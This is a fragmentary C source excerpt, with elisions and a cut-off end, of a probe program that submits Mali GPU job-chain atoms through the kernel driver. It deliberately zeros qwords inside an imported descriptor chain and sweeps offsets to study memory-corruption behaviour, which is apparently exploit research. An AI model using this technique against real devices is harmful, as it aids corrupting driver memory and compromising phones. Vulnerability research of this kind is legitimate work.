...
static void reset_imported_chain(void *ion_map, uint64_t import_gpu_va,
...
static void reset_outputs(uint64_t *scratch_cpu, uint64_t *mid_cpu, uint64_t *dest_cpu)
{
...
static void summarize_case(const char *label, const struct base_jd_event_v2 *evs,
                           uint32_t nr_evs, uint64_t *scratch_cpu,
                           uint64_t *mid_cpu, uint64_t *dest_cpu)
{
    uint32_t atom1 = 0, atom2 = 0;
    uint32_t i;

    for (i = 0; i < nr_evs; i++) {
        if (evs[i].atom_number == 1 || evs[i].atom_number == 50 || evs[i].atom_number == 60)
            atom1 = evs[i].event_code;
        else
            atom2 = evs[i].event_code;
    }

    msync(scratch_cpu, 4096, MS_SYNC | MS_INVALIDATE);
    msync(mid_cpu, 4096, MS_SYNC | MS_INVALIDATE);
    msync(dest_cpu, 4096, MS_SYNC | MS_INVALIDATE);
    printf("%-20s atom1=%-18s atom2=%-18s scratch=%016llx mid=%016llx dest=%016llx\n",
           label, event_name(atom1), event_name(atom2),
           (unsigned long long)scratch_cpu[0],
           (unsigned long long)mid_cpu[0],
           (unsigned long long)dest_cpu[0]);
}

static void run_cross_case(int fd, const char *label,
                           struct base_jd_atom_v2_old56 *atoms,
                           struct base_jd_event_v2 *evs,
                           uint32_t *writer_jc_cpu, void *ion_map,
                           uint64_t import_gpu_va, uint64_t writer_jc_gpu_va,
                           uint64_t scratch_gpu_va, uint64_t mid_gpu_va,
                           uint64_t dest_gpu_va, uint64_t corrupt_target,
                           uint64_t *scratch_cpu, uint64_t *mid_cpu,
                           uint64_t *dest_cpu,
                           const struct base_external_resource *import_res_shared)
{
    memset(atoms, 0, 2 * sizeof(*atoms));
    build_zero_desc(writer_jc_cpu, corrupt_target);
    reset_imported_chain(ion_map, import_gpu_va, scratch_gpu_va, mid_gpu_va, dest_gpu_va);
    reset_outputs(scratch_cpu, mid_cpu, dest_cpu);

    fill_atom(&atoms[0], writer_jc_gpu_va, BASE_JD_REQ_CS, 1, 0, 0);
    fill_atom(&atoms[1], import_gpu_va, BASE_JD_REQ_CS | BASE_JD_REQ_EXTERNAL_RESOURCES,
              2, (uint64_t)(uintptr_t)import_res_shared, 1);
    set_dep(&atoms[1].pre_dep[1], 1, BASE_JD_DEP_TYPE_DATA);
    if (submit_atoms(fd, atoms, 2, evs, label) == 0)
        summarize_case(label, evs, 2, scratch_cpu, mid_cpu, dest_cpu);
}

static void run_self_case(int fd, const char *label,
                          struct base_jd_atom_v2_old56 *atom,
                          struct base_jd_event_v2 *ev,
                          void *ion_map, uint64_t import_gpu_va,
                          uint64_t scratch_gpu_va, uint64_t mid_gpu_va,
                          uint64_t dest_gpu_va,
                          uint64_t *scratch_cpu, uint64_t *mid_cpu,
                          uint64_t *dest_cpu,
                          const struct base_external_resource *import_res_shared,
                          uint64_t desc0_target, uint64_t desc1_target,
                          uint64_t desc2_target)
{
    reset_outputs(scratch_cpu, mid_cpu, dest_cpu);
    build_zero_desc_with_next((uint32_t *)ion_map, desc0_target, import_gpu_va + 64);
    build_zero_desc_with_next((uint32_t *)ion_map + 16, desc1_target, import_gpu_va + 128);
    build_zero_desc_with_next((uint32_t *)ion_map + 32, desc2_target, 0);
    msync(ion_map, 4096, MS_SYNC | MS_INVALIDATE);

    fill_atom(atom, import_gpu_va, BASE_JD_REQ_CS | BASE_JD_REQ_EXTERNAL_RESOURCES,
              60, (uint64_t)(uintptr_t)import_res_shared, 1);
    if (submit_atom(fd, atom, ev, label) == 0) {
        msync(ion_map, 4096, MS_SYNC | MS_INVALIDATE);
        summarize_case(label, ev, 1, scratch_cpu, mid_cpu, dest_cpu);
    }
}
...
static void run_probe(void)
{
    ...
    uint64_t import_gpu_va = 0, jc_gpu_va = 0, dest_gpu_va = 0;
    ...
    struct base_external_resource import_res_shared[1];
    struct base_jd_atom_v2_old56 chain[2];
    struct base_jd_event_v2 chain_evs[2];
    struct base_jd_atom_v2_old56 atom;
    struct base_jd_event_v2 ev;
    ...
    printf("=== Mali imported-extres chain matrix ===\n");
    ...
    printf("import=0x%llx jc=0x%llx scratch=0x%llx mid=0x%llx dest=0x%llx jc_cpu=%p dest_cpu=%p\n",
           (unsigned long long)import_gpu_va,
    ...
    if (!jc_gpu_va || !dest_gpu_va || !scratch_gpu_va || !mid_gpu_va || !import_gpu_va ||
    ...
    printf("Cross-atom imported-extres chain matrix (writer atom zeros one qword before the imported chain starts):\n");
    run_cross_case(mali_fd, "control", chain, chain_evs, jc_cpu, ion_map, import_gpu_va,
                   jc_gpu_va, scratch_gpu_va, mid_gpu_va, dest_gpu_va, import_gpu_va + 192,
                   scratch_cpu, mid_cpu, dest_cpu, import_res_shared);

    printf("\n=== descriptor1 qword sweep ===\n");
    for (i = 0; i < (int)(sizeof(offsets) / sizeof(offsets[0])); i++) {
        snprintf(label, sizeof(label), "desc1+%d", offsets[i]);
        run_cross_case(mali_fd, label, chain, chain_evs, jc_cpu, ion_map, import_gpu_va,
                       jc_gpu_va, scratch_gpu_va, mid_gpu_va, dest_gpu_va,
                       import_gpu_va + 64 + (uint64_t)offsets[i],
                       scratch_cpu, mid_cpu, dest_cpu, import_res_shared);
    }

    printf("\n=== descriptor2 qword sweep ===\n");
    for (i = 0; i < (int)(sizeof(offsets) / sizeof(offsets[0])); i++) {
        snprintf(label, sizeof(label), "desc2+%d", offsets[i]);
        run_cross_case(mali_fd, label, chain, chain_evs, jc_cpu, ion_map, import_gpu_va,
                       jc_gpu_va, scratch_gpu_va, mid_gpu_va, dest_gpu_va,
                       import_gpu_va + 128 + (uint64_t)offsets[i],
                       scratch_cpu, mid_cpu, dest_cpu, import_res_shared);
    }

    printf("\n=== self-modifying imported chain cases ===\n");
    run_self_case(mali_fd, "self desc1 next", &atom, &ev, ion_map, import_gpu_va,
                  scratch_gpu_va, mid_gpu_va, dest_gpu_va, scratch_cpu, mid_cpu, dest_cpu,
                  import_res_shared, import_gpu_va + 64 + 24, mid_gpu_va, dest_gpu_va);
    printf("self desc1 next qword=0x%016llx\n",
           (unsigned long long)((uint64_t *)ion_map)[11]);
    run_self_case(mali_fd, "self desc1 type", &atom, &ev, ion_map, import_gpu_va,
                  scratch_gpu_va, mid_gpu_va, dest_gpu_va, scratch_cpu, mid_cpu, dest_cpu,
                  import_res_shared, import_gpu_va + 64 + 40, mid_gpu_va, dest_gpu_va);
    printf("self desc1 type qword=0x%016llx\n",
           (unsigned long long)((uint64_t *)ion_map)[13]);
    run_self_case(mali_fd, "self desc2 type", &atom, &ev, ion_map, import_gpu_va,
                  scratch_gpu_va, mid_gpu_va, dest_gpu_va, scratch_cpu, mid_cpu, dest_cpu,
                  import_res_shared, mid_gpu_va, import_gpu_va + 128 + 40, dest_gpu_va);
    printf("self desc2 type qword=0x%016llx\n",
